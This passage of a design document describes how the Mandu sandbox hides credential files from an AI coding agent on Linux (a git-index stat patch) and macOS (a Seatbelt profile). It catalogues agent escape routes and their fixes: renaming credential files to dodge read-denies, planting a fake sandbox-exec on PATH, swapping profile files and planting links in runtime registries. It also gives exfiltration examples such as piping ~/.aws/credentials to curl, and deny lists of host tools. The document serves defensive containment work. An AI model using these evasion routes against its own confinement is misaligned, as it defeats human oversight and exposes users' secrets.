bwrap: a `git commit -a` after an edit of both twins (an unedited twin of
a tracked file is left out since 2026-10-17, below) named by commit, with a
repair that takes both placeholders out and leaks nothing, a commit of
another file not named, a killed session's commit named by the next
launch, a commit plus an untracked and an ignored file staged, repaired in
the printed order, a walk cache swapped for a link outside the home
refused with the records behind it neither read nor removed, the
two-session case, and the branch switch, on which the second build's
repair put the real `.env` in the branch's index).

**A twinned file git tracks looks clean (2026-10-17).** git decides that a
tracked file is unchanged from the stat it caches in the index entry
(`ce_match_stat`: size, mtime and ctime, inode, owner), reading the file
only when they differ. The twin is another file, so git in the agent's
world found every stat field changed, hashed the twin, which is not the
committed blob, and called the file modified. Every command that needs a
clean tree refused there (`git filter-branch`, `git rebase`, `git pull
--rebase`, `git stash`, a `git checkout` that touches the file), and a
`git commit -a` after ANY edit recorded the placeholder ("A placeholder in
your repository", above). Found by the demo battery (2026-10-16, demo-c4,
"scrub a committed key from git history"): the model ran `git
filter-branch --index-filter 'git rm --cached … .env' -- --all` without
untracking `.env` first, filter-branch refused ("Cannot rewrite branches:
You have unstaged changes"), nothing was rewritten, and since the command
named `.env` its whole output reached the model as one symbol, so the model
never saw the refusal and reported success. Without Mandu the same command
works (and, as its last step checks out the rewritten HEAD, deletes the
still-tracked `.env` from the work tree).

*The mechanism* (`launcher/src/twin-index-stat.ts`, after the placeholder
watch, which already lists each twinned file's index blobs), ONLY WHERE THE
GUARD SERVES THE TWINS (the confined posture, bind or guard-only; never
bind-only, see the trade-off below), and ONLY IN THE LAUNCH'S OWN
REPOSITORIES (the scope, below). For each
twinned file git tracks whose index entry is its path's only one (stage 0),
a plain file (100644, neither assume-unchanged nor skip-worktree), and
whose real bytes hash to that entry's blob (`git hash-object
--no-filters`, computed in the launcher, never by git; a file the user
changed before the launch stays modified, as it is):

1. the twin's mtime is set two whole seconds back, so the entry is never
   "racily clean" (an entry no older than the index file is re-read
   whatever its stat says, and smudged on the next write; whole seconds
   hold for a git built with or without `USE_NSEC`);
2. the twin's stat, as git in the agent's world sees it (the bind shows the
   twin file's own inode; the guard answers a stat of the path with the
   twin file's metadata, "Guard-only metadata" above), is written into the
   entry's ten stat words. The blob id, the mode, the flags and every other
   entry are untouched;
3. the write follows git's own lock protocol: `index.lock` created with
   `O_EXCL | O_NOFOLLOW` (a git holding it wins: nothing is written), the
   index opened `O_NOFOLLOW`, a regular file of the user's in a real
   directory of the user's, read whole under the lock (versions 2, 3 and 4,
   SHA-1 and SHA-256, the trailing checksum verified, or all zero under
   `index.skipHash`), patched in place (fixed-width words: no entry moves,
   so the extensions' offsets stay right), read back as an index of the
   same entries, resealed, and renamed over `index`. A split index (`link`:
   its entries live in a shared file named by its hash) or a required
   extension other than `sdir` is left alone;
4. BEFORE that rename, the crash record: the index path, each entry's
   path, blob and stat words before and after (the restore matches the
   "after" words; it never writes the "before" ones back, see *At the
   end*), written 0600 to
   `state/object-walks/twin-index/` in the HOME's own Mandu home
   (`~/.mandu`, on-disk-layout.md §3) WHATEVER MANDU_HOME SAYS
   (`twinIndexWriteStore`, 2026-10-21): a launch run with its own
   MANDU_HOME (the demo battery's sides, a scratch home removed after the
   run) patches the user's repositories all the same, and a record kept in
   that home went with it. Every launch hides the HOME's own Mandu home from
   the agent (`manduHomes`), so the agent can neither read nor write the
   record, and it is never in the agent-writable `.git`. Fsynced with its
   folder. A record that cannot be written and synced leaves that index
   alone.

   The index file itself is the history step's (`--git-path index`, read in
   the same `rev-parse` as the step's other facts of that work tree at this
   launch, RepoFacts `index`), so the patch asks no `rev-parse` of its own;
   a work tree the step did not read (nothing to hide there, a failed read,
   a git before 2.27 that takes the old split) is asked as before, and a
   failure of that call still leaves the index alone and says so.

git in the agent's world then finds the stat equal and does not read the
file: unmodified. An edit (even a `touch`) of the twin changes its stat, so
git reads it, and the file shows modified as an edit of the real file would;
a `git commit -a` after it records the placeholder, which the exit check
names as before ("A placeholder in your repository"). Nothing a model or
the agent could not see before is in the index: the blob id was there, and
the cached size, the real file's before, is now the twin's.

*THE TRADE-OFF (the maintainer's choice, 2026-10-17).* git keeps one stat
per entry, read by both worlds. While the session runs, git OUTSIDE it (the
user's own terminal, an editor's git panel) finds the real file's size
different from the cached (twin's) size and, as git does for a non-zero
cached size (`ie_modified`), calls the file modified WITHOUT reading it:
`git status` lists ` M .env` and `git diff` shows nothing until the
session ends. What the user's own commands then do there (git 2.53,
reproduced by the review of !1642):

- `git rebase` and `git filter-branch` refuse ("You have unstaged
  changes");
- `git stash` RUNS: it finds no content change, so the stash is empty, but
  its internal `reset --hard` rewrites `.env` with its committed bytes, as
  do `git reset --hard`, `git restore .`, `git checkout -- .`, `--autostash`
  and an editor's "Discard changes". The content is the same (the real file
  is its blob: the patch is made only then); the FILE is new (a new inode);
- `git add` of it stores the same blob, with the real file's stat, which
  puts the agent's view back to modified for the rest of the session.

A whole-file replace of a protected file during a session is what the
guard's by-path open covers: the agent's programs still get the twin of the
new file (§10.1, "a file replaced while the agent runs"). Under the bind
ALONE (bind-only, `gated`: no guard) a replace detaches the bind and the
agent's programs read the new real file
(rootless-confinement-ubuntu-2404.md §13 finding 7): a rare event there,
which the spurious ` M` would turn into one routine git commands trigger. So
the patch is made only where the guard serves the twins; in bind-only the
twin shows modified to git in the session, as before. With the guard on,
the user's `git stash` during a session is harmless: it stashes nothing
and rewrites the file with the same bytes. The patch lasts only as long as
the session:

- *At the end* (`restoreTwinIndexes`, the first step after the agent exits,
  before the services stop: the rest of the teardown can take seconds, and
  a SIGTERM or SIGHUP there keeps its default action and ends the launcher;
  also when the launch aborts before the agent starts, and when the secret
  setup itself throws after the patch, `applySecretTwins`'s wrapper), each
  entry that still holds exactly the stat written at launch and the same
  blob gets a TRUE stat, under the same lock protocol (waiting up to 2 s
  for a lock another git holds): the real file's stat as it is then
  (`realFileNow`: `lstat`, the bytes read `O_NOFOLLOW` from the same file
  and hashed to the entry's blob, what a `git add` would cache), or, where
  the bytes are no longer the blob (the user edited, removed or replaced
  the real file during the session), a zero stat, which git reads as "never
  stat'ed" and answers by reading the file (`ie_modified`), so the change
  shows as it is. An entry git has changed since (the user's `git add`, the
  agent's staging or commit, a `filter-branch` that dropped it, a later
  session's patch) is left as git left it. The record is removed once every
  index is done.

  *Never the launch stat (2026-10-21).* Until then the restore wrote back
  the stat the entry held at launch, which can be ANOTHER session's twin
  stat. The demo battery runs six sides at once, each with its own Mandu
  home, so no side saw another's record: side A patched the main
  checkout's `scripts/ci/pins.env` (its walk covers the real home), side B
  then took A's twin stat as its launch stat, A ended first and left B's
  stat alone, and B's end wrote A's twin stat back. Both sessions had ended
  cleanly, so no record was left anywhere, `mandu reap` found nothing, and
  the user's git showed ` M` with no diff for days (refusing a
  fast-forward that changed the file) until a `git add`. The real file's
  stat, taken at the end, does not depend on what any session saw at launch. Only a lock held
  throughout keeps it for a later try (the one transient failure; a record
  older than 30 days goes after one more try whatever it finds). Any other
  failure (the index gone, made a symlink, split, or not reading back since:
  the agent can cause most of these) is final: said once, the record
  dropped, and the user's `git add` of the file clears what is left.
- *A file the session untracked* (the entry gone at the end: `git rm
  --cached`, a history rewrite such as demo-c4's) that `.gitignore` does
  not name gets one exit line (`git check-ignore`, hardened): a later `git
  add -A` or `git add .` outside the session would commit the REAL file.
- *After a crash* (the launcher killed: no end runs), the record's
  launcher is gone (its pid, that process's start time and the boot, as for
  the placeholder records), and the next launch restores it BEFORE its own
  patch, and says so (`put back the index stat of a protected file an
  earlier session left`); `mandu reap` does the same. Until then the user's
  git shows the file modified as during the session. The record is in the
  HOME's own store whatever Mandu home the launch ran with, so a launcher
  killed in a scratch home that is removed after it (the demo battery's
  sides) is still repaired: every launch and every `mandu reap` reads the
  HOME's store and, when MANDU_HOME names another home, that home's too
  (records an older launcher left there; `twinIndexReadStores`). Should a
  record still be lost (the HOME's own home removed), the next session on
  that repository patches over the stale stat and its end writes the real
  file's; the user's `git add` of the file does the same.
- *Two sessions on one repository*, in one Mandu home or two: the second
  patches over the first's twin stat, the first's end then finds the
  second's and leaves it, and whichever ends last writes the real file's
  stat. Only the later session's agent sees the file clean while both run;
  if the later one ends first, the earlier one's git sees the file modified
  for the rest of its session.

*The scope: the launch's own repositories (2026-10-21).* The walk twins a
protected file anywhere under the home, so the placeholder watch lists every
repository that tracks one (on a dev host the Mandu checkout, its worktrees
and others: 4 to 7). Patching them all cost 160 to 225 ms at launch and 70
to 84 ms at exit, and, by the trade-off above, showed the user's git ` M` in
repositories the session never touches (the user's main checkout while a
session ran in an unrelated directory). Now only the repositories the
launch's workspace is in are patched (`reposInWorkspace`): the work tree
that holds the launch directory (the NEAREST one, so a launch from a linked
worktree placed inside its main checkout's directory, `.claude/worktrees/x`,
patches that worktree, never the main checkout) and every work tree the
launch directory holds (a launch from above several repositories patches
each; a launch from the home itself, all of them, as before). Both sides by
their real spellings, so a symlinked launch directory counts. A launch from
a plain directory patches nothing.

Every other repository is as it was before the patch existed: git in the
agent's world finds its twinned file modified (a clean-tree command there
refuses; a `git commit -a` there records the placeholder), its index is
never written, and the user's git there never shows the spurious ` M`.
That is the trade-off of the scope: an agent that `cd`s into another
repository works there with the twin modified. The placeholder watch is NOT
scoped: it still checks every repository it found after the session, so a
placeholder committed in an unpatched repository is still named with its
repair ("A placeholder in your repository", above). What the agent can read
is unchanged: the twins, the git object twins and the history step cover
every repository as before. Measured with `mandu claude --version`, 5 runs
each: from an empty directory 0 of 4 repositories patched (the patch's
~160 ms and the restore's ~70 ms gone; median wall 1.79 s to 1.51 s); from
inside a Mandu worktree 1 of 4 (patch ~165 ms to ~54 ms, restore ~70 ms to
~21 ms).

*Why not the alternatives.* (a) A twin as long as the real file, its mtime
the real file's, and `core.checkStat=minimal` for the agent's git only
(through `GIT_CONFIG_*`): it would leave the index untouched, but git
compares size and mtime even then, a field placeholder is usually LONGER
than its value (demo-c4's twin is 12 bytes longer than the real file), so
padding cannot match it; padding would show the real length (the twin is
built never to), and `minimal` weakens change detection in every
repository the agent touches. (b) `skip-worktree` or `assume-unchanged`:
the agent's edits of the twin would not show, and on the shared index they
hide the user's edits too. (c) A session-private index: git replaces
`index` by renaming `index.lock` over it, which a bind over `index`
refuses (EBUSY), and `GIT_INDEX_FILE` applies to every repository the agent
touches. (d) A clean filter: it would have to output the real bytes. (e)
An fsmonitor hook: git marks an entry valid only after finding it clean,
which this one is not.

*What runs now* (the kernel e2e): demo-c4's `filter-branch` without
untracking first rewrites every commit in both postures; its last step's
removal of the still-tracked `.env` from the work tree is refused ("unable
to unlink '.env': Permission denied": the bind's twin, or the guard), so
the user's file stays, key and all, untracked. `git stash`, `git rebase`
and a `commit -a` of other work leave the file alone.

*Residuals.* A `touch` or an edit-and-revert of the twin shows modified for
the rest of the session (git compares the twin with the blob). A git
outside that `git add`s the file during the session puts the agent's view
back to modified. A git the agent left running after it exited (a
background `git status`, a daemon) can write the twin's stat back into the
index after the end-of-session restore: git outside then shows ` M` again,
until the user's `git add` of the file (same content) or the next launch's
own patch and restore. A crash's record is lost with `state/object-walks/` when
an unprotected launch the arbiter could not record deletes it
(on-disk-layout.md §3); the user's `git add` of the file then clears the
` M`. A record planted by something running unconfined (it could write the
index itself) can only rewrite stat words of an index entry that holds the
stat it names. Tests: `launcher/test/unit/twin-index-stat.test.ts` (real
git: the defect reproduced; clean in index versions 2, 3, 4, SHA-256 and
`skipHash`; an edit and a touch show modified; a `commit -a` of other work
leaves the file out; filter-branch, stash and rebase run; nothing written
for a dirty real file, a conflict, assume-unchanged, skip-worktree, an
executable or another blob; git's lock wins; a symlinked and a split index
refused; the restore only over the session's own stat; the trade-off pinned
(` M` outside with no diff, a clean-tree command refused, clean after the
restore); a corrupt index throws; the record written before the index
lands, a crash restored by the next launch and a live one left, a record
that cannot be written leaving the index alone, two sessions in both
orders, a lock held through the end, a final failure dropping the record,
the age limit, the record's exact shape; R10 the 2026-10-21 incident (two
sessions in two Mandu homes, the first ending first: the real file's stat,
never the first's twin stat), R11 a launcher killed in a home removed with
it (the next session's end leaves the real stat), R12 a real file edited,
removed or made a link during the session (a zero stat: git shows the
change), R13 `realFileNow`, S1 the scope (a workspace inside a
repository, one holding several, a plain directory, symlinked spellings, a
worktree inside its main checkout's directory and one beside it), W1 the
record store's paths, W2 a record that outlived a removed scratch home
restored from another MANDU_HOME (and one an older launcher left in
MANDU_HOME's home), X1 the index file from the step's facts (no rev-parse;
each fallback asks once; a failed call still leaves the index alone), X2
the facts name each work tree's own index; an untracked file named unless
ignored; a required extension refused),
`launcher/test/unit/secret-setup.test.ts` (the wiring; a failing patch never
refuses; bind-only never patched; a setup that throws after the patch puts
the index back; only the workspace's repositories reach the patch while the
placeholder watch keeps every one; the index file taken from the step's facts
with no rev-parse, and the record in the HOME's store under another MANDU_HOME), and `tests/sandbox/launcher/twin-git-clean.test.ts` (the
real launcher, both confined postures: T1 demo-c4 without untracking first
and its untracked-file line, T2 the `commit -a` cases and the exit warning,
T3 the trade-off and the restore, T4 a launcher SIGKILLed mid-session
repaired by the next launch, T5 bind-only not patched, T6 the 2026-10-21
incident: two overlapping launches with their own Mandu homes, the first
ending first, and the user's git clean after both; red before the fix,
T7 the scope: another repository under the home keeps its index, the
user's git there clean during the session, the agent's git there sees the
twin modified, the launch's own repository clean in the agent's world, T8
a launcher SIGKILLed in a scratch MANDU_HOME that is then removed,
repaired by `mandu reap` and, separately, by the next launch, each from yet
another MANDU_HOME; red with the record in the launch's own home).

### 7.3 macOS — **deny, not twin** (and why the accepted asymmetry becomes a hole)

macOS has **no mount namespaces**, so §7.2's in-place content substitution is
not available: nothing unprivileged can make `~/.aws/credentials` *read as* its
symbol. What macOS *can* do, unprivileged, is make it **unreadable**, and that
is enough for the security half of the claim, at a cost in the utility half.

**Why the integrity profile is not enough.** `exec-supervisor/src/sandbox.rs`
`seatbelt_profile()` renders the AgentShell world as an SBPL profile for
`sandbox-exec` (unprivileged: no root, no kext), and it contains
`(allow file-read*)`. That line is **correct for integrity and wrong for
confidentiality.** `exec-routing.md` §5 calls the read-through an "ACCEPTED
ASYMMETRY": Seatbelt cannot remount the AgentView twin, so a command sees
the *real* file, which is safe for integrity *because reads reach the model
only via Bash-result symbolization* (E4). For the confidentiality lattice,
**a subprocess seeing real secret bytes is the entire threat.** The benign
asymmetry becomes the hole. The fix is one rule class:

> **The macOS valve.** Add a `(deny file-read* (literal "<secret path>"))`
> for each registered secret, after the blanket `(allow file-read*)` (SBPL
> is last-match-wins, so the deny lands on top). The profile applies to the
> process **and its children**, so `cat ~/.aws/credentials | curl …` fails
> at `cat` with EPERM, exactly as the Linux twin makes it yield a token.

As built, the whole-agent Seatbelt profile (`launcher/src/seatbelt-profile.ts`,
applied by `seatbelt-setup.ts`)
carries these denies, plus `subpath` denies of read and write over Mandu's
own stores (§7.2a); the macOS branch has the historical hardware record in packaging.md §6,
and the current integration needs fresh Mac validation.

**What this costs: in-place routing.** Under the Linux twin, reading a secret
*succeeds* and returns the symbol, so `curl -H "Authorization: $(cat
~/.aws/credentials)"` keeps working: the token flows and the egress gate
substitutes the real value at the bound destination. Under a macOS deny,
that read *fails*. The agent can no longer obtain a secret's symbol by
reading its file, so it needs another way to learn it.

**Pre-registration, which improves both platforms.** The arbiter
**symbolizes catalog secrets up front** (at launch) rather than waiting for
the agent to read them. Then:

- The symbol exists in the table without any agent read, so routing works on
  **both** platforms; the agent learns names, never bytes.
- The label stops depending on the §6 origin-text derivation for registered
  secrets: the registry is authoritative, which retires the §10.1 item-3
  soundness gap for exactly the files that matter most.
- Twin (Linux) vs deny (macOS) collapses to an *enforcement detail* of one
  invariant: **raw secret bytes are absent from the agent's world.** Linux
  keeps the friendlier shell semantics; macOS blocks reads of the named credential files and leaves the residuals
  below; the handling prompt teaches the difference ("use the
  registry symbol; do not `cat` the file").

**Dead ends, recorded so nobody re-derives them:**

- **`DYLD_INSERT_LIBRARIES` cannot port an LD_PRELOAD interposer.** SIP
  strips `DYLD_*` when executing platform binaries, and `/bin/cat`,
  `/usr/bin/curl` are exactly that. (The Linux `fs-preload` interposer is
  itself retired: cooperative-only, never a boundary.)
- **`chmod`-ing the user's own secrets** is racy, destructive, and reversible
  by the agent (same uid). Not a control.
- **macFUSE** *could* serve a true twin, but it is a third-party kernel
  extension requiring user approval: an unacceptable default dependency.
  Viable only as an opt-in for a deployment that wants Linux-grade
  semantics on a Mac.
- **Endpoint Security (`ES_EVENT_TYPE_AUTH_OPEN`)** is the real macOS analog
  of the Linux kernel tier (ground-truth `open` authorization), but it needs
  an Apple-granted entitlement **and** root. **DECIDED — WILL NOT IMPLEMENT
  (2026-07-16)**: out of scope under the non-root principle
  (privilege-model.md §0), unlike the Linux kernel valve, which needs only
  an unprivileged userns and stays deferred.

**Caveat on `sandbox-exec`:** Apple has marked it deprecated for years while
continuing to ship it (Anthropic's own `sandbox-runtime` and the Codex CLI
both rely on it). Treat it as supported-but-at-risk: the deny rules are a
small, isolated slice of the profile, so an eventual replacement changes the
mechanism, not the design.

**Net: the security property is portable; the ergonomics are not.** Linux
gets "reads return a token"; macOS gets "reads fail". Both get "raw secret
bytes never exist in the agent's world", which is the property §3.2 claims.

#### The whole-agent profile (2026-09-29)

**The first cut was a read-deny alone, and it had a hole.** It rendered
`(allow default)` plus `(deny file-read* (literal P))` per secret. Probed on
macOS 26.5.1 with a scratch canary: `mv ~/.aws/credentials x && cat x` printed the
raw value, and so did `mv ~/.aws ~/.a2 && cat ~/.a2/credentials` (a path rule
follows the name, not the file). Mandu's own state was readable too
(`~/.mandu/mandu.db` holds registered values in plaintext; the event store holds
originals), and none of the Linux guard's other rules (write-protect, the Unix
socket list) nor landlock-net had a macOS counterpart. So the launch now runs
the agent under ONE Seatbelt profile that enacts all of them
(`launcher/src/seatbelt-profile.ts`, pure and pinned by
`test/unit/seatbelt-profile.test.ts`; assembled and applied by
`seatbelt-setup.ts`, where the macOS secret profile used to be applied, inside
the reply filter). Every path rule is emitted for the given spelling AND its
canonical one (Seatbelt matches `/private/tmp`, never `/tmp`), sorted and
deduped. The wrap is `/usr/bin/sandbox-exec -p <profile text>`: the text
rides the argv, and nothing is read back by path (2026-09-30). It was `-f
<scope run dir>/seatbelt/agent.sb`, a file in the runtime base, which stays
writable to the agent of ANOTHER session (its profile does not name this
session's files): that agent could swap the file between the launcher's
write and sandbox-exec's read and start this session's agent under a
profile of its own. `-p` and `-f` share the one limit (a compiled profile
of at most 64 KiB). A copy for reading is still written 0600 to
`<scope run dir>/seatbelt/agent.sb`, in a fresh 0700 dir with
`O_CREAT|O_EXCL|O_NOFOLLOW`, and is write-denied to this session's agent; a
copy that cannot be written costs a note, never the profile. The wrap is
named by absolute path (`SANDBOX_EXEC`) and checked by that path
(`sandboxExecAvailable`: the launch, the proxy's posture prediction and
`mandu doctor` all ask it), never looked up on PATH. The chain is exec'd with
the agent's PATH, whose user folders (`~/.local/bin`, `/opt/homebrew/bin`)
come before `/usr/bin` and are not write-protected, so a bare name let a
`sandbox-exec` the agent planted in one session run the next session's agent
with no profile while that launch still said `read-blocked` (review
2026-09-29). The reply filter's BSD script is `/usr/bin/script` for the same
reason (pty-relay.md §3.2).

| # | Component | Rule | When |
|---|---|---|---|
| 1 | credential files | `deny file-read* file-write*` (literal) on each file; `deny file-write-unlink` (literal) on every folder above it | posture `read-blocked` |
| 2 | Mandu's own state | `deny file-read* file-write*` (subpath) on the Mandu home (`MANDU_HOME`, else `~/.mandu`; on-disk-layout.md §4, one rule) and the session's event dir; `deny file-write*` on the install dir (`install-prefix`) and an explicit `MANDU_POLICY_FILE`. Plus Mandu's own stores of originals (`ownStoresHidden`: the home, the account's own home under a scratch HOME, every event dir, this launch's egress CA key), read and write denied, the home's carve-outs (the frozen integrity modes' AgentView, `full`'s repo.git) allowed back after the denies | the state base: confidentiality ON, integrity OFF (`secrets`); the stores of originals: confidentiality ON, any integrity setting |
| 3 | write-protect | `deny file-write*` (subpath) on every entry of the list, `ask` entries included (refused: no Inbox hold, write-protection.md §8), plus `~/Library/LaunchAgents` and xcrun's per-user cache `$(getconf DARWIN_USER_TEMP_DIR)xcrun_db` (write-protection.md §8.5.2); the home entry's carve-outs `allow file-write*` after it | every mode but `off`; `MANDU_WRITE_PROTECT=0` |
| 4 | network | `deny network-outbound (remote tcp)` then allow the landlock-net port set (Mandu's own services on `localhost` only); `deny network-bind (local ip)`, UDP binds re-allowed, the bind ports allowed | `--no-landlock-net` off (exec-routing.md §7.1) |
| 5 | Unix sockets | `deny network-outbound (remote unix-socket)` then allow the list (exec-routing.md §4.3); refused over it (`darwinUnixRefuse`): docker and kin, a host tmux, and the control sockets of WezTerm, iTerm2, kitty (`KITTY_LISTEN_ON`) and an Emacs server; the human's extras over that | confidentiality ON; `MANDU_UNIX_POLICY=0` |
| 6 | host services | `deny process-exec` of `open`, `osascript`, `launchctl`, `crontab`, `at`, `batch`; `deny appleevent-send` | with 5 |
| — | the arbiter's human plane | `deny file-read* file-write*` (subpath) and `deny network-outbound (remote unix-socket (subpath …))` on each human-plane directory: the launch's own (the reported human socket's directory, `<runtime base>/human`) and `<base>/human` under every registry base (the account's default base and rendezvous, where the resident stack lives when the launch has a `MANDU_RUNTIME_DIR` of its own; since 2026-09-30), after every file and socket allow and before the TCP rules; the folders above each (its runtime base included) unrenameable (arbiter-human-plane.md §6) | every mode but `off` (the guard's `unixDeny` on Linux) |
| — | Mandu's runtime registries | `deny file-write*` on `instances/`, `dashboards/`, `vm-guests/`, `logs/`, `release-check/` and `test/` (subpath), `current`, the legacy `arbiter.sock` and `dashboard.log` (literal, the entry itself: `current` is a link), and the promotion's temp link `.current.tmp-` and `mandu dashboard`'s `dashboard-` port files (prefix), under the launch's runtime base and the account's default base and rendezvous, after every file allow; the folders above them unrenameable (`runtime-registry.ts`, applied by `seatbelt-setup.ts`; runtime-instances.md §2, "planted paths"). One that holds the workspace, the runtime base or the scope dir REFUSES the launch (parse.ts already refuses a scope id that names one) | every mode but `off`, no opt-out (nothing the agent does writes them); on Linux the same entries ride the guard's write-protect list (write-protection.md §2, "Mandu's runtime registries") |

Each rule was chosen by probe (`launcher/test/darwin/seatbelt-live.test.ts`
runs the rendered profile under `sandbox-exec`): `file-write*` on the file
blocks truncate, replace-by-rename, `rm`, `chmod`, `renamex_np(RENAME_SWAP)`
and `exchangedata`; `file-read*` blocks `ln` and `cp -c` (`clonefile`); a
PARENT's rename needs `file-write-unlink` on that folder itself, a literal so
its other files stay writable. `(remote tcp "localhost:P")` matches 127.0.0.1
and ::1. Only `(local ip "*:P")` re-allows a bind (`(local tcp "*:P")` never
matches one). The Unix-socket rules are rendered BEFORE the TCP rules: after
them, the bare unix-socket deny misfired on a TCP connect to about 6% of
allowed ports (by port number), a Seatbelt quirk measured over 550 randomized
runs, none of which ever allowed what it should deny. Name lookups keep
working: `getaddrinfo` goes through `/private/var/run/mDNSResponder`, which is
on the socket list, and UDP is untouched (as landlock-net leaves it).

**Mandu's runtime registries (2026-09-30).** The agent must keep the runtime
base writable (its session dir is there), while the arbiter, the dashboard,
the launcher and `mandu reap` run outside the profile and use predictable
names in that base: the arbiter writes its manifest through
`.manifest.json.<pid>.tmp` and promotes through `.current.tmp-<pid>`, its
start-up sweep, every dashboard start and `mandu reap` remove what they take
for dead registry entries, a guest entry in `vm-guests/` names a scratch dir
for `mandu reap` to delete, the launcher and the supervisor append to
`logs/`, and `mandu dashboard` appends to `dashboard.log` and has the
dashboard write its port through `dashboard-<pid>.port.tmp`. A link or a
forged entry the agent planted there would have one of them act for it:
write through the link into a file the write-protect component refuses the
agent (a review reproduced `~/.zshrc` appended to through `dashboard.log`
and replaced by a port number through the `.port.tmp` name), forge a live
instance's manifest with a dead pid so the next sweep removes the live
socket, bind the arbiter's socket in a directory the agent controls, or
(swapping `instances/` or `dashboards/` for a link to the user's files) have
a sweep delete entries there. So the profile write-denies those entries, in
the launch's base and in the account's default base and rendezvous (the
user's resident stack lives there when a launch has a `MANDU_RUNTIME_DIR` of
its own), and nothing else of either base. The writers are hardened on every
platform too (the arbiter's and the dashboard's temp files `O_EXCL`, the
instance dir made exclusively and `0700`, the logs opened `O_NOFOLLOW` and
refused unless a regular file with one link, no sweep through a linked
`instances/` or `dashboards/`, a scope dir never adopted; runtime-instances.md
§2). The one list is `launcher/src/runtime-registry.ts`;
`runtime-registry-parity.test.ts` (tests/integration) pins it to the
packages that own the names and scans their sources for any other entry
joined onto a runtime base.
Probed on macOS 26.5 (`seatbelt-live.test.ts`, "the runtime registries"): a
link at the manifest's temp name, a pre-made instance dir (either spelling of
the base), a forged manifest by rename, a truncation, a removal, a link in an
instance's `logs/`, renaming `instances/`, removing or replacing `current`
(directly or through `.current.tmp-<pid>`), a dashboards entry or its temp
link, creating `vm-guests/` or `test/`, a link at the autostart log, removing,
replacing or appending to `dashboard.log`, a link at `dashboard-<pid>.port.tmp`
(either spelling) or a write of `dashboard-<pid>.port`, the same plants in a
second base (the account's default one) and renaming that base, and binding
a socket in `instances/` or at the legacy path are all refused (EPERM) and
leave every registry entry as it was; the data socket still answers by its path
and through `current`, a reader still reads the manifest, and the session's
dir and a new dir in either base stay writable. `(prefix "P")` matches a
name prefix: `.current.tmpX` and `dashboardX` stay writable (probed).

The launch says what it enforces: `mandu: mode secrets (N credential files
unreadable (read-blocked))` (never "masked", never a pinned reader: no program
is handed the real file), a `seatbelt LIVE` line naming the components, and a
`network-confine LIVE` line in place of landlock-net's. The Linux-only rungs
(exec-box, net-guard, the inspect-mcp confine, landlock-net's applier) print
one informational line each and never "not built … proceeding WITHOUT it".

**What it does not cover (docs/guarantees.md §3).** The Keychain: `security`
and the Keychain services stay reachable (Claude Code keeps its own login
there). Programs that ask launchd or another service over Mach/XPC to run
code, other than through the six denied programs (a copied `launchctl`
works; a copied `open` or `osascript` is killed at exec by code signing). A
hard link to a credential file made before the launch. The committed bytes of
a protected file (the Linux object-store twins, §7.2a, have no macOS
counterpart), and every version a plan-14 history lock covers (below): the
launch prints ONE warning naming each repository where one is committed or
staged, or a locked version is held. Sockets the agent's own programs open outside its
workspace (only the workspace stands in for Linux's "listener in the tree"),
and the converse: the workspace allow is a `subpath`, so a launch from HOME
(or a folder above many projects) admits every socket under it except the
refusal list, a list of what is known, not a proof (review 2026-09-29).
The folders on PATH and Mandu's own launcher outside its install folder
(`~/.local/bin/mandu`, a writable `npm install -g` prefix such as Homebrew
node's, a source checkout) are not on the write-protect list, as on Linux: a
program planted there runs outside the profile when something calls it by
name later. The HOME walk does not enter `~/Library`, `~/.Trash`,
`~/Pictures`, `~/Music` or `~/Movies` except for catalog paths and labels
(§7.2). A nested Seatbelt profile cannot start (Claude Code's own sandbox,
Codex's), so Mandu turns those off for the session (plan 10 §12.3), and
their own limits on where commands write and connect do not apply under
it: a gap to close by adding them to Mandu's profile. The rest of the runtime base stays writable, the scope dirs
of other and later launches included. A scope dir made in advance under a
predictable `<epoch>-<pid>` name is refused by the launch it was made for
(never adopted, runtime-instances.md §10.2), and no launch reads its profile
back from the base; but ANOTHER session's scope dir is open to the agent
while that session runs, so a file that session's launcher or services
write there by name during its start (the proxies' port files, the agent
and MCP configs, `launch.log`) follows a link planted in that window, and a
named scope (`--id`) that already exists is reused. Only the logs Mandu
opens there refuse a link (follow-up work, runtime-instances.md §2).

Mandu's OWN git (the launch's committed-file and locked-version checks, the
arbiter's history scan and lock resolver; the prepared copies are Linux
only) runs outside this profile, under a Seatbelt profile of its own
(write-protection.md §8.5.2: no fork, no exec but
git, no network, no write but the call's cache), wherever `sandbox-exec`
can run the git the probe resolves: a separate profile, applied by the
launcher and the daemons, never nested in the agent's. Mandu's other git
calls (its single reads, the dashboard, fs-sync) are hardened only. A
`mandu` command the agent itself runs is the exception: its git runs inside
the agent's profile, which confines it, and gets no git profile of its own.

#### Plan 14 on macOS: the history locks, and the caches' seals (2026-09-30)

**The history locks are not enforced on macOS, and every surface says so.**
Plan 14's locks (a labelled path gone from the work tree and a `blobs:` lock,
§8 of the plan; the R2 global locked set; the R3 prepared copies; the R4
backstop) are all enacted by `hideGitHistory` and the guard, which run on
Linux only. On macOS a locked version stays readable to programs the agent
runs (`git show`, `git log -p`). Nothing enforces it there yet (the static
Seatbelt counterpart, a read-deny on the object files holding a locked id,
is recorded in the plan's §11.3 as the gap to close). What is built is
honesty:

- **At launch** (`secret-setup.ts`, both the confined-file branch and the
  no-file one): `gitHistoryLocks(workspaceRoots)` is asked exactly as the
  Linux launch asks it, so the workspace joins the known-repository
  registry the same way (R1); an arbiter that predates the op holds no lock
  and nothing is said; any other failure is one WARNING, never a refusal
  (nothing on macOS would be protected by refusing).
  `lockedHistoryRepos` then looks every locked id (the `blobs:` locks above
  `public`, the global set, the resolved labelled versions) up by name in
  each of the launch's repositories (the workspace's, a confined file's),
  the way the Linux planner does (each pack's `.idx`, the loose objects; no
  blob is read). A workspace whose labelled paths the arbiter has not
  resolved yet, while a label above `public` reaches inside it, or one git
  cannot name the object store of, is named as not checked. The result
  joins the committed-file notice (`gitHistoryNotice`): ONE warning per
  launch, naming the repositories.
- **`mandu doctor --secrets`** (`doctor-secrets.ts`, `historyHiddenHere`): on
  macOS the history advice says a rule makes a file unreadable but leaves
  its committed versions readable, and a protected file's history is never
  shown as covered. It has no preparation section: the daemon prepares no
  copies on macOS (`preparedCopiesOff`), so there is nothing to report.
- **`mandu policy suggest`** (`policy-suggest.ts`): on macOS a history
  suggestion's impact line says `(on Linux)`, the review adds one line that
  the committed versions stay readable here, a covered history finding is
  covered on Linux only, and applying one says it holds on Linux launches
  only. A workspace suggestion promises only the file, which macOS does make
  unreadable, so it is unchanged.
- **The dashboard's Suggested view** (`dashboard/src/view-model/suggestions.ts`
